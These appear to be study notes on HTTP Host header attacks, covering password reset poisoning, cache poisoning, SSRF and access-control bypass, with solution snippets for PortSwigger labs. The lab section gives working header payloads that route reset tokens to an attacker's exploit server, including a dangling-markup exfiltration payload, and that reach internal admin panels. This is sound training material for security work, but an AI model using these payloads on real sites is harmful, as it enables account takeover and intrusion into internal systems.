# HTTP Host header attacks

## **How to test for vulnerabilities using the HTTP Host header**

- **Supply an arbitrary Host header**
- **Check for flawed validation**
- **Send ambiguous requests**
    - **Inject duplicate Host headers**
    - **Supply an absolute URL**
    - **Add line wrapping**
- **Inject host override headers**

## **Exploit the HTTP Host header**

### **Password reset poisoning**

Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behavior can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ultimately, compromise their accounts. 

#### **How to construct a password reset poisoning attack**

If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

1. The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use `evil-user.net`.
2. The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset
token that is associated with their account. However, the domain name in the URL points to the attacker's server: `https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j`
3. If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server.
4. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account.

In a real attack, the attacker may seek to increase the probability of the victim clicking the link by first warming them up with a fake breach notification, for example.

### **Web cache poisoning via the Host header**

It may be found that the Host header is reflected in the response markup without HTML-encoding, or even used directly in script imports. Reflected, client-side vulnerabilities, such as XSS, are typically not exploitable when they're caused by the Host header. There is no way for an attacker to force a victim's browser to issue an incorrect host in a useful manner

However, if the target uses a web cache, it may be possible to turn this useless, reflected vulnerability into a dangerous, stored one by persuading the cache to serve a poisoned response to other users. 

### **Exploiting classic server-side vulnerabilities**

Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable. 

### **Accessing restricted functionality**

For fairly obvious reasons, it is common for websites to restrict access to certain functionality to internal users only. However, some websites' access control features make flawed assumptions that allow you to bypass these restrictions by making simple modifications to the Host header. This can expose an increased attack surface for other exploits. 

### **Accessing internal websites with virtual host brute-forcing**

Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server. Servers typically have both a public and a private IP address. As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records

In some cases, the internal site might not even have a public DNS record associated with it. Nonetheless, an attacker can typically access any virtual host on any server that they have access to, provided they can guess the hostnames. If they have discovered a hidden domain name through other means, such as information disclosure, they could simply request this directly. Otherwise, they can use tools like Burp Intruder to brute-force virtual hosts using a simple wordlist of candidate subdomains. 

### **Routing-based SSRF**

It is sometimes also possible to use the Host header to launch high-impact, routing-based SSRF attacks. These are sometimes known as "Host header SSRF attacks", and were explored in depth by PortSwigger Research in [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface).

### **Connection state attacks**

For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.

For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.

### SSRF via a malformed request line

Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.

For example, a reverse proxy might take the path from the request line, prefix it with `http://backend-server`, and route the request to that upstream URL. This works fine if the path starts with a `/` character, but what if starts with an `@` character instead?

```
GET @private-intranet/example HTTP/1.1
```

The resulting upstream URL will be `http://backend-server@private-intranet/example`, which most HTTP libraries interpret as a request to access `private-intranet` with the username `backend-server`.

## Labs

[**Basic password reset poisoning**](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)

```markdown
# Exploit Password Reset functionality by changing Host header to malicious one.
# Password reset token is being sent with malicious Host header.
# Victim opens each email, so check access log to retrieve reset token. 
**Host: exploit-ID.exploit-server.net**
```

[**Password reset poisoning via middleware**](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

```markdown
# Exploit Password reset functionality by **host override headers.
# Password reset token is being sent with malicious override Host header.
# Victim opens each email, so check access log to retrieve reset token.
Host: ID.web-security-academy.net
X-Forwarded-Host: exploit-ID.exploit-server.net**
```

[**Password reset poisoning via dangling markup**](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

```markdown
# Exploit Password reset functionality by Host header flawed validation.
# Note that double colomn character (:) is being appended to Host header,       leading to Dangling Markup Injection, which retrieves One-Time Password
# **Victim opens each email, so check access log to retrieve password.
Host: ID.web-security-academy.net:'>Click Me</a><img src="//exploit-ID.exploit-server.net/?data=**
```

[**Web cache poisoning via ambiguous requests**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

```markdown
# Exploit Password reset functionality by injecting dublicate Host header.
# Dublicate Host header is reflected in the response, leading to XSS attack.
# Cache the malicious Host header into the response to affect each user,        visiting the home page
Host: ID.web-security-academy.net
Host: exploit-ID.exploit-server.net
```

[**Host header authentication bypass**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

```markdown
# Accessing the restircted admin resource by modifying the Host header
GET /admin
Host: localhost
```

[**Routing-based SSRF**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)

```markdown
# Application is vulnerable to induce arbitrary connections via Host header
# Brute force internal IP's via intruder - 192.168.0.0/254
# Note that one of the inernal IP is being used for Admin panel
GET /admin HTTP/2
Host: 192.168.0.93

```

[**SSRF via flawed request parsing**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

```markdown
# Application is vulnerable to induce arbitrary connections via Host header
# Observe that home page is accessible with absolute URL
GET https://ID.web-security-academy.net/ HTTP/2
# Notice, modifying the Host header no longer causes request to be blocked
# Brute force internal IP's via intruder - 192.168.0.0/254
# Note that one of the inernal IP is being used for Admin panel
GET https://ID.web-security-academy.net/admin HTTP/2
Host: 192.168.0.114
```

[**Host validation bypass via connection state attack**](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)

```markdown
# Server only perform thorough validation on the first request they receive     over a new connection.
# Send two request in sequence, using repeator Groups. Put internal admin IP    addresss in the second request to bypass Host header validation.
Request 1:
GET / HTTP/1.1
Host: ID.web-security-academy.net

Request 2:
GET /admin HTTP/1.1
Host: 192.168.0.1
```